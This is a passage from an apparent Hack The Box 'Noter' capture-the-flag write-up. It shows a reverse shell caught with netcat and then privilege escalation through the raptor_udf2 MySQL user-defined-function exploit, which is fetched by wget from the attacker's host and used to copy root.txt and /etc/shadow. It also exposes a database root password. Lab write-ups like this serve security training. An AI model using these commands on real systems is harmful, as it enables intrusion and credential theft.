font-style: inherit;">,2</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">import</span> pty<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">pty.spawn</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"bash"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' # '</span></span></code></pre></div>
<p>Export the file and grab the shell.</p>
<p><img src="https://exploit.se/posts/2022-05-23-htb-writeup-noter/images/noter06.png" class="img-fluid"></p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter python3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> http.server 80  </span>
<span id="cb12-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://0.0.0.0:80/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb12-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.160</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [23/May/2022 10:39:35] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /rev.md HTTP/1.1"</span> 200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb12-4"></span>
<span id="cb12-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488            </span>
<span id="cb12-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb12-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.26</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.160]</span> 50188</span>
<span id="cb12-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh:</span> 0: can<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'t access tty; job control turned off</span></span>
<span id="cb12-9"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">$ id &amp;&amp; hostname</span></span>
<span id="cb12-10"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">uid=1001(svc) gid=1001(svc) groups=1001(svc)</span></span>
<span id="cb12-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">noter</span></span>
<span id="cb12-12"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">$ cat user.txt  </span></span>
<span id="cb12-13"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">39482bdad8ae80f8eb950cab59f5ffc2</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>My first finding was the backup script <code>backup.sh</code>, and within we see the astirix being used. Here I spent some time looking if it was possible to exploit using <em>shell globbing</em> but to no avail.</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span> /opt</span>
<span id="cb13-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 12</span>
<span id="cb13-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>  2 root root 4096 May  2 23:05 .</span>
<span id="cb13-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 19 root root 4096 May  2 23:05 ..</span>
<span id="cb13-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxr--r--</span>  1 root root  137 Dec 30 09:41 backup.sh</span>
<span id="cb13-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/$</span> cd opt</span>
<span id="cb13-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/opt$</span> cat backup.sh</span>
<span id="cb13-8"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#!/bin/bash</span></span>
<span id="cb13-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">zip</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> /home/svc/ftp/admin/app_backup_<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">date</span> +%s<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">)</span>.zip<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span> /home/svc/app/web/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-x</span> /home/svc/app/web/misc/node_modules/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">**</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\*</span></span></code></pre></div>
<p>Instead I moved on to the MySQL database, to which we found root credentials in one of the backup files. (<code>root:Nildogg36</code>)</p>
<p>Download the privesc https://www.exploit-db.com/exploits/1518 and write it to file, <code>raptor_udf2.c</code>. We meet all the criterias as we can login to MySQL as root. Create a user defined function for code execution and grab sensitive files and/or setup a reverse shell.</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/dev/shm$</span> wget http://10.10.14.26/raptor_udf2.c</span>
<span id="cb14-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/dev/shm$</span> gcc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-g</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> raptor_udf2.c</span>
<span id="cb14-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/dev/shm$</span> gcc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-g</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-shared</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Wl,-soname,raptor_udf2.so</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> raptor_udf2.so raptor_udf2.o <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lc</span></span>
<span id="cb14-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/dev/shm$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb14-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxrwt</span>  3 root root   120 May 23 11:39 .</span>
<span id="cb14-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 20 root root  4040 May 23 10:46 ..</span>
<span id="cb14-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span>  4 root root    80 May 23 10:46 multipath</span>
<span id="cb14-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>  1 svc  svc   4920 May 23 11:39 raptor_udf2.c</span>
<span id="cb14-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>  1 svc  svc   7432 May 23 11:39 raptor_udf2.o</span>
<span id="cb14-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxr-xr-x</span>  1 svc  svc  19360 May 23 11:39 raptor_udf2.so</span>
<span id="cb14-11"></span>
<span id="cb14-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:~/app/web$</span> mysql <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--user</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>root <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--host</span> localhost</span>
<span id="cb14-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> password: Nildogg36</span>
<span id="cb14-14"></span>
<span id="cb14-15"></span>
<span id="cb14-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> [<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">none</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> use mysql<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb14-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">mysql</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> show variables like <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%plugin%'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb14-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">show</span> variables like <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'%plugin%'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb14-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----------------+---------------------------------------------+</span></span>
<span id="cb14-20"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Variable_name</span>   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Value</span>                                       <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----------------+---------------------------------------------+</span></span>
<span id="cb14-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">plugin_dir</span>      <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/lib/x86_64-linux-gnu/mariadb19/plugin/</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">plugin_maturity</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gamma</span>                                       <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----------------+---------------------------------------------+</span></span>
<span id="cb14-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2</span> rows in set <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.001</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-26"></span>
<span id="cb14-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">mysql</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> create table foo<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">line</span> blob<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb14-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">create</span> table foo<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">line</span> blob<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb14-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Query</span> OK, 0 rows affected <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.006</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-30"></span>
<span id="cb14-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">mysql</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> insert into foo values<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">load_file</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'/dev/shm/raptor_udf2.so'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">));</span></span>
<span id="cb14-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">insert</span> into foo values<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">load_file</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'/dev/shm/raptor_udf2.so'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">));</span></span>
<span id="cb14-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Query</span> OK, 1 row affected <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.003</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-34"></span>
<span id="cb14-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">mysql</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> select <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> from foo into dumpfile <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb14-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">adb19/plugin/raptor_udf2.so</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">';le '</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/lib/x86_64-linux-gnu/mari</span> </span>
<span id="cb14-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Query</span> OK, 1 row affected <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.001</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-38"></span>
<span id="cb14-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">mysql</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> create function do_system returns integer soname <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'raptor_udf2.so'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb14-40"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">o</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">';ate function do_system returns integer soname '</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">raptor_udf2.s</span> </span>
<span id="cb14-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Query</span> OK, 0 rows affected <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.001</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-42"></span>
<span id="cb14-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">mysql</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> select <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> from mysql.func<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb14-44"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">select</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> from mysql.func<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb14-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----------+-----+----------------+----------+</span></span>
<span id="cb14-46"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">name</span>      <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ret</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dl</span>             <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">type</span>     <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----------+-----+----------------+----------+</span></span>
<span id="cb14-48"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">do_system</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">raptor_udf2.so</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">function</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-49"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----------+-----+----------------+----------+</span></span>
<span id="cb14-50"></span>
<span id="cb14-51"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MariaDB</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">mysql</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> select do_system<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'cat /root/root.txt &gt; /dev/shm/flag.txt; chown svc:svc /dev/shm/flag.txt'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb14-52"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc:svc</span> /dev/shm/flag.txt<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">');oot.txt &gt; /dev/shm/flag.txt; chown </span></span>
<span id="cb14-53"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">+--------------------------------------------------------------------------------------+</span></span>
<span id="cb14-54"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">| do_system('</span>cat /root/root.txt <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /dev/shm/flag.txt<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chown</span> svc:svc /dev/shm/flag.txt<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">') |</span></span>
<span id="cb14-55"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">+--------------------------------------------------------------------------------------+</span></span>
<span id="cb14-56"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|                                                                                    0 |</span></span>
<span id="cb14-57"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">+--------------------------------------------------------------------------------------+</span></span>
<span id="cb14-58"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">1 row in set (0.003 sec)</span></span>
<span id="cb14-59"></span>
<span id="cb14-60"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">MariaDB [mysql]&gt; select do_system('</span>cat /etc/shadow <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /dev/shm/shadow<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chown</span> svc:svc /dev/shm/shadow<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">');</span></span>
<span id="cb14-61"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">svc /dev/shm/shadow'</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">)</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/etc/shadow</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /dev/shm/shadow<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chown</span> svc: </span>
<span id="cb14-62"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-------------------------------------------------------------------------------+</span></span>
<span id="cb14-63"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">do_system</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'cat /etc/shadow &gt; /dev/shm/shadow; chown svc:svc /dev/shm/shadow'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-64"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-------------------------------------------------------------------------------+</span></span>
<span id="cb14-65"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>                                                                             <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-66"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-------------------------------------------------------------------------------+</span></span>
<span id="cb14-67"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> row in set <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.004</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>Reap the rewards and prosper.</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/dev/shm$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb15-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb15-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 44</span>
<span id="cb15-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxrwt</span>  3 root root   200 May 23 13:05 .</span>
<span id="cb15-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 20 root root  4040 May 23 12:51 ..</span>
<span id="cb15-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw----</span>  1 svc  svc     33 May 23 13:02 flag.txt</span>
<span id="cb15-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw----</span>  1 svc  svc    152 May 23 13:01 ls</span>
<span id="cb15-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span>  4 root root    80 May 23 12:51 multipath</span>
<span id="cb15-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>  1 svc  svc   3300 May 23 12:51 raptor_udf2.c</span>
<span id="cb15-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>  1 svc  svc   7432 May 23 12:54 raptor_udf2.o</span>
<span id="cb15-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxr-xr-x</span>  1 svc  svc  19360 May 23 12:54 raptor_udf2.so</span>
<span id="cb15-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw----</span>  1 svc  svc   1474 May 23 13:05 shadow</span>
<span id="cb15-13"></span>
<span id="cb15-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/dev/shm$</span> cat ls</span>
<span id="cb15-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 8</span>
<span id="cb15-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span> 2 root root 4096 May  2 23:05 .</span>
<span id="cb15-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span> 9 root root 4096 May  2 23:05 ..</span>
<span id="cb15-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-------</span> 1 root root    0 Dec 21 20:38 authorized_keys</span>
